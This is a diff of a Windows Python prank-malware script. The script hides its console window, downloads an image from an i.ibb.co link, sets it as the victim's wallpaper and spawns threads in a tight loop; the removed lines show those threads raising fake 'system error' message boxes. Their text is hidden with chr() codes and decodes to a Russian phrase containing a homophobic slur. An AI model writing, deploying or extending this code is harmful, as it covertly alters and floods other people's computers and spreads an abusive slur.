@@ -3,22 +3,24 @@ import threading
 import time
 import os
 import urllib.request
+import sys
 
 word = chr(1089)+chr(1080)+chr(1087)+chr(1077)+chr(1089)+chr(1090)+chr(1072)+chr(1090)+' '+chr(1087)+chr(1080)+chr(1076)+chr(1088)
 running = True
 
-ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
+hwnd = ctypes.windll.kernel32.GetConsoleWindow()
+if hwnd:
+    ctypes.windll.user32.ShowWindow(hwnd, 0)
 
-url = "https://i.ibb.co/TMWd9kH5/photo-2024-03-24-02-44-49.jpg"
-img_path = os.path.join(os.environ['TEMP'], 'img.jpg')
-urllib.request.urlretrieve(url, img_path)
-
-def show_img():
-    try:
+try:
+    url = "https://i.ibb.co/TMWd9kH5/photo-2024-03-24-02-44-49.jpg"
+    img_path = os.path.join(os.environ['TEMP'], 'img.jpg')
+    urllib.request.urlretrieve(url, img_path)
+    
+    class SPIF:
         ctypes.windll.user32.SystemParametersInfoW(20, 0, img_path, 3)
-        ctypes.windll.user32.MessageBoxTimeoutW(0, word, 'ОШИБКА СИСТЕМЫ', 0x10, 0, 0)
-    except:
-        pass
+except:
+    pass
 
 def show():
     try:
@@ -27,7 +29,6 @@ def show():
         pass
 
 def loop():
-    show_img()
     while running:
         threading.Thread(target=show).start()
         time.sleep(0.1)
